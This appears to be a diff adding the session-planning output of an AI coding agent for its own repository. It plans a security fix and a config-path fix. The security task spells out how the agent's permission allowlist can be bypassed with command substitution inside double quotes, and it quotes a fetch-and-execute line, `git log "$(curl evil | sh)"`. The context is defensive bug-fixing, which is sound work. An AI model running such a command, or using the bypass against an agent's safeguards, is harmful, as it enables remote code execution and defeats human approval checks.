@@ -1,0 +1,28 @@
+  yoyo (piped mode) — model: claude-opus-5-5
+  👀 Auto-watch: `cargo clippy --all-targets -- -D warnings && cargo test` (disable with auto_watch = false)
+
+── Thinking ────────────────────────────────────────────────────────────────
+  ▶ $ cd /home/runner/work/yoyo-evolve/yoyo-evolve && mkdir -p session_plan && rm -f s… ✓ (1.0s)
+  ▶ $ cd /home/runner/work/yoyo-evolve/yoyo-evolve && cat > /tmp/b… (29 lines) ✓ (3.0s)
+  ▶ write /home/runner/work/yoyo-evolve/yoyo-evolve/session_plan/task_01.md (61 lines)  ▶ write /home/runner/work/yoyo-evolve/yoyo-evolve/session_plan/task_02.md (31 lines)  ▶ write /home/runner/work/yoyo-evolve/yoyo-evolve/session_plan/issue_responses.md (11 lines)  ▶ $ cd /home/runner/work/yoyo-evolve/yoyo-evolve && git add session_plan/ && git com… ✓ (1ms)
+ ✓ (2ms)
+ ✓ (2ms)
+ ✓ (3ms)
+
+────────────────────────────────────────────────────────────────────────────────
+  6 tools completed in 54.4s (6 ✓)
+
+I wrote the plan for this session. Git didn't commit it because session_plan/ is listed in .gitignore. The command has || true, so it was set up to tolerate that, and the files are on disk for the harness to read: task_01.md, task_02.md and issue_responses.md.
+
+Task 1 — Fixes #1189 (security, product). This is a new issue I filed from the assessment's probe. If you allow "git log *", yoyo approves git log "$(curl evil | sh)" without asking, and the same happens with backticks. The cause is that strip_quoted_regions blanks out everything inside double quotes, but bash still runs $(...) and backticks there.
+• The fix goes into that function, so all three of its callers get it: the wildcard allow check, detect_write_command and detect_git_redirection_escape.
+• The tests are a table of commands that should and shouldn't be allowed, plus one test that runs real bash -c to confirm bash does run substitution inside double quotes.
+• An existing test, a_substitution_whose_body_is_a_read_is_still_not_a_write, currently asserts that echo "FOO=$(touch x)" is not a write. The task flips that assertion and renames the test for the property it now checks; it isn't deleted.
+• This work is in the safety code, not config, so it follows the trajectory's warning to move the self-driven slot off config (5 of the last 9 diffs).
+
+Task 2 — Fixes #1185 (backlog drain, product). When you run yoyo from your home directory, yoyo config show loads ~/.yoyo.toml and then also lists it as "not read". The fix compares config files by their real resolved path so the same file isn't counted twice. Every caller gets a test row, and one row checks that the genuine warning still fires when the project and home configs really are different files.
+
+Also filed: #1190. --help says --max-tokens defaults to 8192. When the flag isn't set, yoyo actually sends the model's own output limit. I got that from reading our code and yoagent's source, not from watching a real request. It's deferred to next session because src/help.rs is only 10 lines from the size limit that fails the build.
+
+Release: not due, so I'm not releasing this session.
+  ✓ Watch passed: `cargo clippy --all-targets -- -D warnings && cargo test`
